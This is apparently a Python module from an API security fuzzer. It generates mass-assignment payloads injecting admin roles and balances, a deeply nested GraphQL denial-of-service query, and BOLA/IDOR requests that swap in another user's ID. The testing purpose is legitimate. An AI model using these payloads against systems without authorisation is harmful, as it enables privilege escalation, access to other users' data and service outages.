# fuzzer/payloads.py
import json

class PayloadGenerator:
    @staticmethod
    def mass_assignment_payloads(base_payload: dict) -> list:
        """
        Takes a valid JSON payload and injects common privileged fields 
        to test for Mass Assignment vulnerabilities.
        """
        malicious_fields = [
            {"is_admin": True},
            {"role": "admin"},
            {"permissions": "superuser"},
            {"account_balance": 999999}
        ]
        
        test_cases = []
        for field in malicious_fields:
            # Merge the base payload with the malicious fields
            test_payload = base_payload.copy()
            test_payload.update(field)
            test_cases.append(test_payload)
            
        return test_cases

    @staticmethod
    def graphql_dos_query(target_node: str, nested_relation: str, depth: int = 10) -> str:
        """
        Generates a deeply nested GraphQL query to test for DoS via 
        circular relationships (e.g., User -> Posts -> Author -> Posts).
        """
        query = "query { " + target_node + " { id "
        
        # Build the deep nesting
        for _ in range(depth):
            query += f"{nested_relation} {{ id "
            
        # Close the brackets
        query += "} " * (depth + 1) + "}"
        return query

    @staticmethod
    def bola_payloads(endpoint: str, valid_id: str, attacker_id: str) -> list:
        """
        Generates BOLA/IDOR test endpoints by swapping resource IDs.
        """
        # Example: /api/users/123/profile -> /api/users/456/profile
        if valid_id in endpoint:
            return [endpoint.replace(valid_id, attacker_id)]
        return []
